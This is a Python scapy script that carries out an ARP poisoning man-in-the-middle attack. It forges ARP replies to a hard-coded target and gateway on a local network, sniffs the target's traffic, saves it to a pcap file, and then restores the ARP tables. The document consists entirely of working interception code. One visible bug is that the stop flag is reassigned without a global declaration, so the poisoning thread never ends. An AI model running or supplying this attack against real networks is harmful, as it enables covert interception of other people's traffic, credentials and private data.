import scapy.all
import os
import sys
import threading

from scapy.layers.l2 import ARP, Ether


interface = "eth0"
target_ip = "192.168.144.146"
gateway_ip = "192.168.144.2"
packet_count = 1000
poisoning = True

result =''
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global result
    # slightly different method using send
    result+="[*] Restoring target..."
    scapy.all.send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    scapy.all.send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


def get_mac(ip_address):
    responses, unanswered = scapy.all.srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
    global result
    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning
    global result
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while poisoning:
        scapy.all.send(poison_target)
        scapy.all.send(poison_gateway)

        scapy.all.time.sleep(2)

    result+=",[*] ARP poison attack finished."

    return

def main():
    global result
    # set our interface
    scapy.all.conf.iface = interface

    # turn off output
    scapy.all.conf.verb = 0

    result+=",[*] Setting up %s" % interface

    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        result+=",[!!!] Failed to get gateway MAC. Exiting."
        return result
    else:
        result+=",[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

    target_mac = get_mac(target_ip)

    if target_mac is None:
        print("[!!!] Failed to get target MAC. Exiting.")
        sys.exit(0)
    else:
        result+=",[*] Target %s is at %s" % (target_ip, target_mac)

    # start poison thread
    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        result+=",[*] Starting sniffer for %d packets" % packet_count

        bpf_filter = "ip host %s" % target_ip
        packets = scapy.all.sniff(count=packet_count, filter=bpf_filter, iface=interface)

    except KeyboardInterrupt:
        pass

    finally:
        # write out the captured packets
        result+=",[*] Writing packets to arper.pcap"
        scapy.all.wrpcap('arper.pcap', packets)

        poisoning = False

        # wait for poisoning thread to exit
        scapy.all.time.sleep(2)

        # restore the network
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)
